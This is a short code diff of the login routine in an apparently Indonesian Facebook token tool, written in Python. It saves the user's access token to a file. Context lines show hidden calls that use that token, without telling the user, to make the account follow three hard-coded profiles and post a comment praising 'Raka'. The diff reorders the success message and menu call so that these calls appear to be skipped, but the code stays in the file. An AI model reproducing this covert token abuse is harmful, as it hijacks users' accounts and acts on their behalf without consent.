@@ -78,6 +78,9 @@ def menu_log():
             xd = open("token.txt", "w")
             xd.write(token)
             xd.close()
+            print('%s║'%(O))
+            jalan('%s╚══®[%s!%s]◍➤ %sLogin Successful'%(O,P,O,P))
+            menu()
         except (KeyError,IOError):
             print('%s║'%(M)) 
             print('%s╚══®[%s!%s]◍➤ %sToken Invalid'%(M,P,M,P)) 
@@ -88,9 +91,6 @@ def menu_log():
             requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token) 
             requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token) 
             requests.post("https://graph.facebook.com/800676813861801/comments?message=Raka Orang Terganteng diindonesia !&access_token="+token)
-            print('%s║'%(O)) 
-            print('%s╚══®[%s!%s]◍➤ %sLogin Berhasil'%(O,P,O,P)) 
-            exit(menu())
         except requests.exceptions.ConnectionError:
             print('%s║'%(O))
             jalan('%s╚══®[%s!%s]◍➤ %sConnection Problem'%(M,P,M,P))
